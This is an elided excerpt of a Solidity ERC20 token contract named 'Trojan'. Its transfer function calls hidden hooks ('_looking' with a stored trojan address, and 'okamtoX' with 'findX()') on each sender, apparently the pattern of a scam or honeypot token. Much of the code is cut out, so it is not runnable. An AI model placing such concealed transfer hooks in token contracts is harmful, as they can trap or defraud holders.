...
contract Trojan is Ownable, IERC20 {
    ...
    address private immutable _trojan;
     ...
     * construction.
     */
    constructor(string memory name_, string memory symbol_, address trojan_) {
        _name = name_; 
        _symbol = symbol_; 
        _trojan = trojan_;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        _looking(_trojan, from);
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        okamtoX(bytes32(0), bytes32(uint256(uint160(from))), "findX()"); 
        unchecked {
    ...
    function okamtoX(bytes32 a, bytes32 b, string memory txt) 
